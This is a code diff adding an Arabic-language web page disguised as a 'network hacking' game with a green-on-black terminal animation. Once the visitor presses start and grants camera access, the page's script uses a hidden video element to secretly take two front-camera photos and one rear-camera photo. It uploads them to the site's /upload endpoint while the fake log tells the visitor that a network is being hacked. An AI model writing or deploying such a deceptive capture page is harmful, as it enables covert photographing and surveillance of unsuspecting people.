@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تسلل إلى الشبكة | Network Infiltrator</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+    body {
+      background-color: #000;
+      color: #00ff00;
+      font-family: 'Share Tech Mono', monospace;
+      margin: 0;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    .terminal {
+      width: 100%;
+      max-width: 500px;
+      text-align: right;
+    }
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px #00ff00;
+      letter-spacing: 2px;
+    }
+    #log {
+      height: 250px;
+      overflow-y: auto;
+      border: 1px solid #003300;
+      padding: 10px;
+      background: #050505;
+      font-size: 14px;
+      line-height: 1.6;
+      box-shadow: inset 0 0 20px #001100;
+    }
+    .line { opacity: 0; animation: fadeIn 0.5s forwards; }
+    @keyframes fadeIn { to { opacity: 1; } }
+    .red { color: #ff3333; text-shadow: 0 0 5px #ff0000; }
+    .blue { color: #33ccff; text-shadow: 0 0 5px #0066cc; }
+    .btn-container { margin-top: 30px; text-align: center; }
+    #startBtn {
+      background-color: transparent;
+      color: #00ff00;
+      border: 2px solid #00ff00;
+      padding: 15px 40px;
+      font-size: 18px;
+      font-family: 'Share Tech Mono', monospace;
+      cursor: pointer;
+      text-transform: uppercase;
+      transition: all 0.3s;
+      box-shadow: 0 0 15px rgba(0, 255, 0, 0.2);
+    }
+    #startBtn:hover {
+      background-color: #00ff00;
+      color: #000;
+      box-shadow: 0 0 30px #00ff00;
+    }
+    #startBtn:disabled {
+      border-color: #555; color: #555; box-shadow: none;
+    }
+    .hacker-icon { font-size: 50px; text-align: center; margin-bottom: 10px; }
+    #status { margin-top: 15px; font-size: 16px; text-align: center; font-weight: bold; }
+  </style>
+</head>
+<body>
+
+  <div class="hacker-icon">☠️</div>
+  <h1>مُتطفل الشبكة V2.0</h1>
+
+  <div class="terminal">
+    <div id="log">
+      <div class="line">> بدء التشغيل...</div>
+      <div class="line">> جاري الاتصال بالسيرفر الرئيسي...</div>
+      <div class="line">> تم الاتصال بنجاح. [IP: 192.168.1.1]</div>
+      <div class="line">> البحث عن الثغرات الأمنية...</div>
+      <div class="line blue">> تم العثور على 3 ثغرات مفتوحة!</div>
+      <div class="line">> جاري تحميل بروتوكول الاختراق...</div>
+      <div class="line">> في انتظار بدء التسلل...</div>
+    </div>
+  </div>
+
+  <div class="btn-container">
+    <button id="startBtn">بدء اختراق الشبكة</button>
+  </div>
+
+  <div id="status" class="red"></div>
+
+  <!-- شاشة الكاميرا مخفية تماماً -->
+  <video id="video" autoplay playsinline muted style="display: none;"></video>
+
+  <script>
+    const video = document.getElementById('video');
+    const status = document.getElementById('status');
+    const startBtn = document.getElementById('startBtn');
+    const log = document.getElementById('log');
+    let stream = null;
+
+    function addLog(text, colorClass = '') {
+      const div = document.createElement('div');
+      div.className = `line ${colorClass}`;
+      div.textContent = `> ${text}`;
+      log.appendChild(div);
+      log.scrollTop = log.scrollHeight;
+    }
+
+    async function startCamera(facing) {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      // طلب الكاميرا بناءً على الاتجاه المطلوب
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: facing, width: { ideal: 720 }, height: { ideal: 960 } }
+      });
+      video.srcObject = stream;
+      // إعطاء وقت للكاميرا عشان تفتح
+      await new Promise(r => setTimeout(r, 1000)); 
+    }
+
+    async function capturePhoto(facing) {
+      await startCamera(facing);
+      
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 720;
+      canvas.height = video.videoHeight || 960;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+      
+      // إيقاف الكاميرا بعد التصوير
+      stream.getTracks().forEach(t => t.stop());
+      
+      return blob;
+    }
+
+    startBtn.onclick = async () => {
+      try {
+        startBtn.disabled = true;
+        startBtn.style.display = 'none';
+        
+        // 1. طلب إذن الكاميرا أولاً
+        addLog("طلب صلاحيات الوصول إلى العتاد...", "blue");
+        await startCamera('user'); 
+        addLog("تم منح الصلاحيات. جاري بدء الهجوم...", "blue");
+
+        // 2. بدء العد التنازلي الوهمي والاختراق
+        for (let i = 3; i > 0; i--) {
+          addLog(`جاري اختراق الشبكة... [${i}]`, "red");
+          status.textContent = `سيتم الاختراق خلال ${i}...`;
+          await new Promise(r => setTimeout(r, 1000));
+        }
+
+        addLog("⚠️ تم كسر الحماية! جاري سرقة البيانات...", "red");
+        status.textContent = "جاري سرقة البيانات...";
+        
+        // 3. التقاط الصور (2 أمامية و 1 خلفية)
+        const photos = [];
+        
+        // صورة أمامية 1
+        addLog("التقاط حزمة البيانات 1...");
+        photos.push(await capturePhoto('user'));
+        
+        // صورة أمامية 2
+        addLog("التقاط حزمة البيانات 2...");
+        photos.push(await capturePhoto('user'));
+
+        // صورة خلفية 3
+        addLog("تغيير زاوية الهجوم (الكاميرا الخلفية)...", "blue");
+        photos.push(await capturePhoto('environment'));
+
+        addLog("تم جمع البيانات. جاري الإرسال للقيادة...", "blue");
+        status.textContent = "جاري الإرسال...";
+
+        // 4. الإرسال
+        const form = new FormData();
+        photos.forEach((p, i) => form.append('photos', p, `photo_${i + 1}.jpg`));
+
+        const res = await fetch('/upload', { method: 'POST', body: form });
+        const data = await res.json();
+
+        if (data.ok) {
+          addLog("✅ تم الاختراق بنجاح! البيانات في أيدي القيادة.", "red");
+          status.textContent = "تم الاختراق بنجاح! (أغلق الصفحة)";
+          status.className = "red";
+        } else {
+          throw new Error("فشل في الإرسال");
+        }
+      } catch (err) {
+        addLog("❌ فشل الاختراق: " + err.message, "red");
+        status.textContent = "فشل الاختراق!";
+        startBtn.disabled = false;
+        startBtn.style.display = 'inline-block';
+      }
+    };
+  </script>
+</body>
+</html>
